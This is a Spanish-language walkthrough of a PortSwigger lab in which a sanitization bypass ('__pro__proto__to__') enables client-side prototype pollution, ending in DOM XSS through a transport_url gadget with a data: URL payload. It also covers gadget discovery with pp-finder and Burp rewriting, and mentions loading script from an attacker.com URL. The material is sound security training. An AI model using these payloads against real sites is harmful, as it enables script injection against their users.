---
title: Client-side prototype pollution via flawed sanitization
description: Laboratorio de Portswigger sobre Prototype Pollution
date: 2026-04-04 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Prototype Pollution
tags:
  - Portswigger Labs
  - Prototype Pollution
  - Client-side prototype pollution via flawed sanitization
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

En este laboratorio es posible explotar un DOM XSS a través de un prototype pollution en el lado del cliente. Aunque los desarrolladores han implementado algunas medidas para prevenir la contaminación del prototipo, estas pueden eludirse fácilmente

---

## Resolución

Al acceder a la web vemos esto

![](/assets/img/Prototype-Pollution-Lab-4/image_1.png)

Lo primero que vamos a hacer es intentar inyectar una propiedad arbitraria a través de la cadena de consulta

```
https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__[foo]=bar
```

Lo siguiente que vamos a hacer es abrirnos la consola del navegador e inspeccionar el Object.prototype para ver si lo hemos contaminado correctamente con la propiedad arbitraria. Como podemos ver, no hemos conseguido contaminar la propiedad

![](/assets/img/Prototype-Pollution-Lab-4/image_2.png)

No pasa nada si esto pasa, ya que hay diferentes formas de contaminar el prototipo. He probado esta forma alternativa de contaminar el prototipo, y tampoco ha funcionado

```
https://0aeb0038032f073c815612f4002600ff.web-security-academy.net/?__proto__.foo=bar
```

![](/assets/img/Prototype-Pollution-Lab-4/image_3.png)

Esto puede ser debido a que se esté implementando algún tipo de sanitización. Si nos abrimos la pestaña Sources, vemos que hay un dos archivos js que tienen un nombre interesante

![](/assets/img/Prototype-Pollution-Lab-4/image_4.png)

Vamos a acceder a deparamSanitised, vamos a setear un breakpoint  y posteriormente a acceder a esta URL https://0abe00e403ed570780d2031b00b60045.web-security-academy.net/?\_\_proto\_\_[foo]=bar

![](/assets/img/Prototype-Pollution-Lab-4/image_5.png)

Una vez hecho esto, veremos algo así. Para avanzar pulsamos F9

![](/assets/img/Prototype-Pollution-Lab-4/image_6.png)

Una vez llegamos aquí, si pulsamos F9 nos llevará al archivo searchLoggerFiltered.js porque ahí es donde se encuentra la función sanitizeKey

![](/assets/img/Prototype-Pollution-Lab-4/image_7.png)

Lo que hace esta función es recorrer la variable key una sola vez y reemplazar las cadenas constructor, \_\_proto\_\_ y prototype por una cadena vacía

![](/assets/img/Prototype-Pollution-Lab-4/image_8.png)

![](/assets/img/Prototype-Pollution-Lab-4/image_9.png)

Como solo hace una pasada podríamos usar este payload \_\_pro\_\_proto\_\_to\_\_[foo]=bar para bypassear la sanitización. En la primera pasada busca constructor y como no lo encuentra pasa a \_\_proto\_\_, en este caso si que lo encuentra y lo elimina. Posteriormente busca prototype, no encuentra nada y finaliza. Como solamente hace una pasada, el payload final que queda es \_\_proto\_\_[foo]=bar

![](/assets/img/Prototype-Pollution-Lab-4/image_10.png)

![](/assets/img/Prototype-Pollution-Lab-4/image_11.png)

Para comprobar que estamos envenenando el prototipo correctamente, quitamos el breakpoint, accedemos a https://0abe00e403ed570780d2031b00b60045.web-security-academy.net/?\_\_pro\_\_proto\_\_to\_\_[foo]=bar y lo comprobamos mediante la consola

![](/assets/img/Prototype-Pollution-Lab-4/image_12.png)

A continuación, nos abrimos el Logger de Burspuite y vemos como se cargan los archivos js

![](/assets/img/Prototype-Pollution-Lab-4/image_13.png)

![](/assets/img/Prototype-Pollution-Lab-4/image_14.png)

El siguiente paso que debemos hacer es descargar estos archivos js y usar pp-finder [https://github.com/yeswehack/pp-finder.git](https://github.com/yeswehack/pp-finder.git) para detectar posibles gadgets. Es importante que los archivos js no contengan comentarios y que PPF_WRAPPER_NAME no coincida con el nombre de ninguna variable, de lo contrario, obtendremos un error

```
PPF_WRAPPER_NAME="deparamSanitised_js_file" npx pp-finder compile --agent browser deparamSanitised.js -o deparamSanitised_compiled.js
```

```
PPF_WRAPPER_NAME="searchLoggerFiltered_js_file" npx pp-finder compile --agent browser searchLoggerFiltered.js -o searchLoggerFiltered_compiled.js      
```

El siguiente paso es usar este comando sobre todos los archivos js compilados para que cuando nos muestre los gadgets que ha encontrado, sepamos a que archivo js pertenecen. Antes de ejecutar este comando es importante que los archivos no tengan en el nombre caracteres que no se puedan usar en nombres de variables, de lo contrario nos dará un error cuando abramos la consola del navegador

```
for f in *_compiled.js; do NAME=$(basename "$f" _compiled.js); sed -i "s|\\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\|\\[$NAME\]\[%cPP%c\]\[%c\${op}%c\] %c\${JSON.stringify(key \|\| \"_\")}%cat \${path} \${loc}\|g" "$f"; done
```

También tenemos que ejecutar este comando, para que además de mostrarse en la consola del navegador los gadgets encontrados, nos los guarde en un archivo

```
sed -i 's/console\.log(\.\.\.format(arg));/const formatted = format(arg); console.log(...formatted); fetch("http:\/\/localhost:9090\/log", {method:"POST",headers:{"Content-Type":"text\/plain"},body:formatted[0].replace(\/%c\/g,"")}).catch(()=>{});/' *_compiled.js
```

Una vez hecho lo anterior, vamos a crearnos un archivo con este contenido que se llame server.py. Esto lo hacemos porque la consola del navegador tiene un límite de contenido a mostrar y porque de esta forma también obtenemos un diccionario con todos los posibles gadgets detectados

```
#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import re

LOG_FILE = "logs.txt"
GADGETS_FILE = "gadgets.txt"

def extract_gadget(line):
    match = re.search(r'"([^"]+)"', line)
    return match.group(1) if match else None

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        line = self.rfile.read(length).decode()

        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")

        gadget = extract_gadget(line)
        if gadget:
            with open(GADGETS_FILE, "a+") as f:
                f.seek(0)
                if gadget not in f.read().splitlines():
                    f.write(gadget + "\n")

        print(line)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(("localhost", 9090), Handler).serve_forever()
```

Ejecutamos el script

```
python server.py
```

Una vez tenemos estos archivos tenemos que dirigirnos a Burpsuite > Proxy settings y habilitar la checkbox que dice Intercept responses based on the following rules

![](/assets/img/Prototype-Pollution-Lab-4/image_15.png)

Lo siguiente que vamos a hacer es crear una regex para aplicar estas sustituciones. En nuestro caso los archivos js están en el body de la response, por lo que debemos seleccionar la opción Response body

```
<script src='/resources/js/deparamSanitised.js'>
```

```
<script>Pegar el contenido de deparamSanitised_compiled.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Lab-4/image_16.png)

```
<script src='/resources/js/searchLoggerFiltered.js'>
```

```
<script>Pegar el contenido de searchLoggerFiltered.js aquí dentro</script>
```

![](/assets/img/Prototype-Pollution-Lab-4/image_17.png)

Una vez hecho esto, tunelizamos el tráfico del navegador a través del proxy para que nos aplique las sustituciones, nos abrimos la consola en el navegador y vemos que en el archivo searchLoggerFiltered hay posibles gadgets

![](/assets/img/Prototype-Pollution-Lab-4/image_18.png)

Lo siguiente que debemos de hacer es desactivar el Match and replace de Burpsuite, abrir la web en una nueva pestaña, abrir la consola de desarrollador y dirigirnos a aquí

![](/assets/img/Prototype-Pollution-Lab-4/image_19.png)

Una vez estamos aquí, pulsamos Ctrl + G y ponemos esto 11:15, para ir a la línea 11 y a la columna 15

![](/assets/img/Prototype-Pollution-Lab-4/image_20.png)

Esto nos lleva a esta línea

![](/assets/img/Prototype-Pollution-Lab-4/image_21.png)

Si añadimos un breakpoint en la línea 11, hacemos una petición a esta URL https://0abe00e403ed570780d2031b00b60045.web-security-academy.net/?\_\_pro\_\_proto\_\_to\_\_[transport_url]=bar y hacemos hover sobre transport_url, vemos que el valor que hemos inyectado ha llegado correctamente a la propiedad transport_url 

![](/assets/img/Prototype-Pollution-Lab-4/image_22.png)

Si quitamos el breakpoint y recargamos la web, vemos que el script nos devuelve un error en esta parte. Esto se debe a que script.src espera recibir una URL, podríamos proporcionar un archivo javascript malicioso mediante una url https://attacker.com/exploit.js o embeber los datos usando una data URL data:text/javascript,alert(1)

![](/assets/img/Prototype-Pollution-Lab-4/image_23.png)

En nuestro caso es mejor usar una data URL porque no tenemos Exploit server en este laboratorio. Para ejecutar nuestro payload malicioso vamos a realizar una petición a https://0abe00e403ed570780d2031b00b60045.web-security-academy.net/?\_\_pro\_\_proto\_\_to\_\_[transport_url]=data:text/javascript,alert(1)

![](/assets/img/Prototype-Pollution-Lab-4/image_24.png)
